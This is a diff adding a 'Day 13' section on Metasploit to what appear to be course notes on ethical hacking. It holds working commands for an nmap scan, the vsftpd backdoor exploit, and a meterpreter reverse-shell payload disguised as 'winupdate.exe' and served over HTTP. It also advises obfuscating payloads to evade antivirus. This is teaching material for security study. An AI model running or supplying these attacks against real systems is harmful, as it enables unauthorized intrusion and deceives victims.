@@ -848,3 +848,62 @@ Always start the listener before executing the payload on the target.
 
 ---
 **Disclaimer:** Use Metasploit only on systems you own or have explicit permission to test.
+
+
+# Day 13 – Hacking with Metasploit
+
+## 📌 Topics Covered
+- Server-Side Exploits
+- Client-Side Exploits
+- Reconnaissance with Nmap
+- Exploiting vulnerable services with Metasploit
+- Creating payloads with msfvenom
+- Handling sessions with multi/handler
+- Serving payloads via Python HTTP server
+- Security considerations
+
+## 🖥 Server-Side Exploits
+Server-side exploits target vulnerable services running on a server.  
+Example workflow:
+```bash
+sudo nmap -sS -sV target_ip
+sudo nmap -A target_ip
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST target_ip
+run
+```
+
+## 💻 Client-Side Exploits
+Client-side exploits target applications on the user's system and require victim interaction.  
+Example workflow:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=8888 -f exe -o winupdate.exe
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 8888
+run
+
+python3 -m http.server 80
+```
+
+## 🔍 Key Differences
+| Feature           | Server-Side Exploit                       | Client-Side Exploit                        |
+|-------------------|-------------------------------------------|---------------------------------------------|
+| Target            | Vulnerable service on a server            | Vulnerable application on client machine    |
+| Initiation        | Attacker initiates remotely               | Victim executes/open malicious content      |
+| User Interaction  | Not required                              | Required                                    |
+| Example           | Exploiting Apache server                  | Sending malicious PDF                       |
+| Risk              | Can compromise server infrastructure     | Limited to client system but can escalate   |
+
+## ⚠️ Security Considerations
+- Attacking without permission is illegal
+- IDS/IPS can detect exploit attempts
+- Social engineering is often required for client-side attacks
+- Antivirus may detect payloads – encoding/obfuscation may be needed
+
+---
+**Disclaimer:** This content is for educational purposes only.
